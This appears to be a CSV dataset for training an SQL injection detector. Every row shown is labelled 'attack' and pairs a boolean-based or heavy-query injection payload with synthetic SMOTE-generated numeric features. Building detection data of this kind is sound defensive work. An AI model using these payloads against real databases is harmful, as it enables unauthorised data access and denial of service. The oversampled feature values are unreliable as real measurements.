id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000542,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,1.0795337151128541,125.77920510317836,30.135540816457283,4.069914990134152,58.74547449051505,16.186445918354273,36.711743877851745,14.135540816457281,0.4427774936663036,0.1492968039379581,0.2959180821286346,0.11200762026710376,0.0,1.0,2.0,0.0,0.8135540816457282,2.0,0.0,4.254216326582911,0.0,0.0,1.6271081632914564,4.813554081645728,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8135540816457281,0.0,1.0,0.8135540816457283,0.18644591835427204,0.8135540816457282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.627108163291456
SMOTE_000543,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,2.2950302394777293,77.46635157021196,19.88720372536831,2.9998909525984585,5.0,20.451185098526754,39.12796274631688,12.887203725368312,0.0664648193595399,0.26270073766431146,0.4972362776978828,0.1735981652782658,1.7744074507366236,0.0,1.0,0.0,1.0,2.0,0.0,6.225592549263376,0.8872037253683118,0.0,-2.220446049250313e-16,4.0,0.44360186268415586,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000544,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,0.2970532800415088,81.51538662003817,29.35153866200382,3.986092940214143,26.28500130302481,16.0,27.010673653260973,12.219711663752385,0.31530840820796974,0.20056424976301437,0.3323135745564235,0.15181376747259234,0.0,3.868173001748569,1.043942332750477,0.0,0.0439423327504771,1.043942332750477,0.0,4.087884665500955,0.0,0.9560576672495229,1.0439423327504769,2.131826998251431,0.0,1.0,0.0439423327504771,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.04394233275047699,0.0,0.0439423327504771,0.0439423327504771,1.0,0.9560576672495229,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.087884665500954
SMOTE_000545,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.024650030357136324,202.87251771029253,33.00910587783625,3.685975438911387,55.99089412216375,26.972682366491256,83.92715297731002,35.981788244327504,0.2759999612954586,0.1329501014470724,0.41368677683241745,0.17736316042505154,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.981788244327504,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9908941221637515,0.009105877836248277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000546,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,0.13606080381216254,232.9095925001447,35.95153744445088,3.7579332976134756,71.58806827783243,26.927306166676313,93.56383700005787,40.830381055578066,0.3072879599557358,0.11566568637223242,0.4017192638493181,0.17532708982271364,0.09692511109824942,0.0,1.9515374444508753,0.0,0.0,1.0242312777745624,0.0,21.854612333352627,0.04846255554912471,1.9757687222254376,3.9757687222254376,12.878843611127188,0.0242312777745623,0.0,0.9757687222254376,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.024231277774562354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.951537444450874,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.975768722225437
SMOTE_000547,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.28483773972154686,357.42457390451557,40.592978884424134,3.7703454609881226,118.34876621507863,35.48842533869104,150.46527601607312,53.12210633467276,0.3313862214282784,0.09920557583490881,0.4207619238336534,0.14864627890315943,4.0,0.0,0.0,0.0,0.0,1.081404223115173,0.0,32.24421266934552,0.0,1.9185957768848267,3.8778936653272407,11.081404223115173,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9592978884424135,1.0407021115575865,0.0,0.0,0.9592978884424135,1.0407021115575865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.040702111557586615,0.0,0.0,0.0,0.0,7.203510557787933,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.284914780903105
SMOTE_000548,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,1.832057072625507,125.23037857241039,35.40052708361969,3.82810838092215,38.115189286205194,17.743459524136796,49.714662202585494,19.6570675594829,0.302821378130815,0.14017876497168266,0.39846986156433317,0.15852999533316917,4.9712026784487024,0.0,0.6858648810341983,1.0,0.0,2.0,0.0,8.3429324405171,1.314135118965802,0.0,1.0,4.028797321551297,1.0,0.0,0.34293244051709915,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3429324405170991,0.0,0.34293244051709915,0.0,0.657067559482901,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3429324405170986
SMOTE_000549,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.7284055433267685,45.47086084518497,17.56585045221243,3.0776045418773372,7.377039006715314,9.905594277251444,20.527971386257228,7.660256174960981,0.1188253325381727,0.24533488177002255,0.46267841005609256,0.1731613756357122,1.3018647590838153,0.0,2.0,0.15093237954190752,0.0,1.0,0.0,3.056526656793352,0.0,0.0,0.1509323795419073,3.1509323795419073,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000550,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.7568284054115892,390.8164559216627,31.0,3.2829233137639298,101.34810329496423,49.01898486171039,185.0,55.449367764988075,0.2593154530028182,0.12543805923411777,0.47336845468222444,0.14187803308083957,3.265823686650765,0.0,0.18354407833730868,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.18354407833731,0.8164559216626912,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.8164559216626914,0.18354407833730885,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000551,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.924942564857167,127.0511754981891,36.40030335437138,3.8661032344902964,39.70053087014992,19.40030335437138,49.85026543507496,18.100075838592844,0.31034305478880975,0.15108096302437235,0.3949178030265343,0.1436581791602836,3.0,0.0,2.0,1.0,0.0,1.5500379192964224,0.0,9.0,0.0,0.0,1.0,5.100075838592845,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5500379192964224,0.0,0.5500379192964224,0.0,0.44996208070357757,0.5500379192964224,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.100075838592845
SMOTE_000552,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.4337174487674746,211.08564238314293,33.78248152094932,3.7041029672711896,60.17323477839635,27.0,86.60827173649773,37.30413586824886,0.2841642601692235,0.12840907026346557,0.41064134567649846,0.17678532389081245,2.9566913054009127,0.0,0.5216543472995436,0.0,0.0,1.7391728263502282,0.0,19.043308694599087,1.4783456527004564,1.2608271736497718,3.260827173649772,9.30413586824886,0.7391728263502282,0.0,0.2608271736497718,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7391728263502282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.521654347299544,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.260827173649772
SMOTE_000553,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.1868808894560649,356.8095758518439,40.761889455340025,3.779436880267306,118.40472363835005,35.54765425271794,149.85719796077592,53.0,0.33204942443736096,0.09951476346264082,0.41986845053379057,0.14856736156620767,3.90475578213601,0.0,0.023811054465997294,0.0,0.0,1.0476221089319946,0.0,32.14286632679598,0.0,1.9523778910680052,3.928566836602008,11.071433163397991,0.9761889455340025,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9761889455340027,1.0238110544659975,0.0,0.0,0.9761889455340027,1.0,0.023811054465997517,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.023811054465997405,0.0,0.0,0.0,0.0,7.119055272329986,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.166677381261984
SMOTE_000554,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,1.2748708165869664,374.09836239613605,31.0,3.393489120351152,97.36612079871202,55.85323874488111,168.90320228203436,51.97580057050859,0.2602337865866758,0.14962323437222727,0.4512542686734655,0.13888871036763142,0.7806404564068707,0.0,2.414519657694847,0.0,0.0,3.0,0.0,34.78064045640687,0.0,0.0,1.0,15.414519657694848,0.19516011410171763,0.0,0.8048398858982824,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8048398858982823,0.0,0.3903202282034354,0.8048398858982824,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000555,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,0.5373078834319787,68.91229751628812,22.31384389250847,3.3145991279439113,8.175122740228801,15.890513008957628,30.18973982084745,14.656921946254236,0.10249236807122153,0.24019882774436585,0.4407012994515428,0.21660750473286977,4.218973982084744,0.0,0.8905130089576275,0.10948699104237247,0.8905130089576275,2.0,0.0,4.43794796416949,2.0,0.0,0.10948699104237236,3.8905130089576274,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000556,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.4711387763900547,58.811365590847444,17.490568279542373,3.31587009538081,6.509431720457627,20.981136559084742,23.849092472677953,7.471704838627112,0.121596559313573,0.3741913275804182,0.37872590729366207,0.1254862058123467,0.0,0.0,2.5094317204576284,0.0,0.2452841397711858,2.0,0.0,2.7169889783983017,0.0,0.0,-2.220446049250313e-16,4.7547158602288135,0.0,0.0,0.7547158602288142,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7547158602288142,0.0,0.2452841397711858,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000557,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.5298980580155039,125.57265575602534,33.11906466327813,3.735145669360593,36.50035792884073,16.071581969503168,51.33381057178763,21.666905285893815,0.2906467499647042,0.1280597501058875,0.40928722292813896,0.1720062770012694,5.761870673443741,0.0,0.0,0.8809353367218703,0.0,2.0,0.0,8.952517306225037,2.0,0.11906466327812959,1.2381293265562594,3.595323316390648,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.11906466327812978,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5953233163906484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5953233163906484
SMOTE_000558,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,1.6760898405769593,195.43568189192393,29.24705266838216,3.578198616928758,102.10610393824224,11.01178932647136,60.0589466323568,22.25884199485352,0.5212958639991532,0.05617584748246349,0.30706796517395385,0.11546032334442945,3.01178932647136,0.98821067352864,0.0,0.0,1.0,2.0,0.0,7.50589466323568,2.0,0.0,5.01178932647136,3.0,0.75294733161784,0.24705266838215997,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.24705266838216,0.75294733161784,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000559,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.9068882516602753,55.04824801703431,17.302412400851715,3.381452563179903,6.697587599148285,20.60482480170343,20.838598413627437,6.907237202555141,0.12975098744302357,0.38722115453858796,0.3587065705102489,0.12432128750813948,0.0,0.0,2.697587599148285,0.0,0.15120620042585733,2.0,0.0,2.058443402981002,0.0,0.0,-2.220446049250313e-16,4.848793799574143,0.0,0.0,0.8487937995741426,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8487937995741428,0.0,0.15120620042585742,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000560,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,2.527732141699902,128.35564648432353,36.312063557927694,3.8651668631226244,39.67782324216176,18.785215494774505,50.365759684234064,19.52684806315319,0.30746277134423994,0.1447254358746296,0.3939942323942448,0.15381756038688565,4.580544189459561,0.0,0.9463038736936262,1.0,0.0,2.0,0.0,8.473151936846813,1.0536961263063738,0.0,1.0,4.419455810540439,1.0,0.0,0.4731519368468131,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.47315193684681306,0.0,0.47315193684681306,0.0,0.5268480631531869,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4731519368468127
SMOTE_000561,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.971371409981508,138.7405538178577,31.199479894354965,4.035639041740089,69.08474837523065,11.142114134792804,41.0,17.513691307834243,0.4987304526281009,0.07787830876189004,0.2984804890246044,0.12491074958540464,0.9426342404378415,0.0,2.0,0.0,1.0,1.3142114134792804,0.0,5.68578858652072,0.0,1.5710570673964024,2.6284228269585608,4.628422826958561,0.31421141347928044,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3142114134792804,0.0,0.3142114134792805,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6284228269585608
SMOTE_000562,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.6203789566461837,211.5609625731863,33.744431528103156,3.7009846522502143,59.34994187646421,27.372215764051578,86.97772611241263,37.86107882025789,0.2798311333377609,0.12992687618704257,0.41152506666413663,0.1787169238110599,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.744431528103156,2.0,1.186107882025789,3.186107882025789,8.744431528103156,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.813892117974211,0.1861078820257891,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.372215764051578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.372215764051578
SMOTE_000563,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,4.618419002446716,221.73030626040187,34.20202991474558,3.985870002222254,63.61623931796461,54.55872506683994,76.360078343337,27.19526353226032,0.31838484796965283,0.2251010099336302,0.3305529937798822,0.1259611483168348,1.2020299147455766,0.0,2.0,0.0,1.5993233617514746,2.0,0.0,12.791203702769169,0.0,2.0033831912426274,5.198646723502949,6.0,0.4006766382485255,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5993233617514745,0.0,3.1986467235029488,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5993233617514745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.797970085254423
SMOTE_000564,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,2.3507164479925584,38.672588141934085,18.20423988209955,3.375696019113293,11.661988436685206,5.204239882099554,14.433114159392382,7.373245663756951,0.2989045501685792,0.10406899360532751,0.3904537572375685,0.20657269898852476,0.0,1.6866228318784755,0.22887427729282517,1.5422514454143497,0.7711257227071748,0.2288742772928254,0.0,2.457748554585651,0.0,0.22887427729282517,0.22887427729282517,2.7711257227071746,0.0,1.0,0.0,0.0,0.7711257227071747,0.22887427729282528,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22887427729282517,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2288742772928254
SMOTE_000565,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.19753994939559402,114.6835488065837,32.41355665989461,3.6973026310125006,33.091012822836646,14.824066997968384,47.17897932385245,19.589489661926226,0.2843922269113903,0.13139059978937137,0.41365952275634704,0.17055765054289124,5.8533891649736525,0.0,0.0,0.9706778329947305,0.0,1.9706778329947305,0.0,7.8533891649736525,1.9706778329947305,0.0,0.9706778329947305,2.941355665989461,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9706778329947303,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9706778329947299
SMOTE_000566,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.9562735627479775,179.6920153959476,34.886474724195466,3.849022670873186,53.22705055160907,24.0,70.23791429272947,32.22705055160907,0.296575072671863,0.13401964066821798,0.39009739957274664,0.1793078870871723,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.227050551609068,1.113525275804534,1.443237362097733,2.113525275804534,8.886474724195466,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.44323736209773296,0.0,0.44323736209773296,0.0,0.556762637902267,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.783813189511335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.227050551609068
SMOTE_000567,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,2.128354549892922,98.94569025539313,29.98182923072155,4.033321651828935,38.7274384608233,16.0,30.90914615360777,13.309105640962072,0.36602055198761124,0.17487079775313377,0.3187364981348126,0.1403721521244424,0.0,3.0181707692784467,1.327276410240518,0.0,0.32727641024051785,1.327276410240518,0.0,4.327276410240518,0.0,0.6727235897594822,1.327276410240518,2.9818292307215533,0.0,1.0,0.3272764102405178,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.32727641024051773,0.0,0.3272764102405178,0.32727641024051785,0.6727235897594823,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.654552820481036
SMOTE_000568,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.1946854395034498,249.47596028083154,36.92067328652808,3.7720738316522744,74.63461370777539,29.0,100.0,45.84134657305615,0.2991227301748884,0.11624847864959266,0.4008568229296298,0.18377196824588915,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.8413465730561531,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
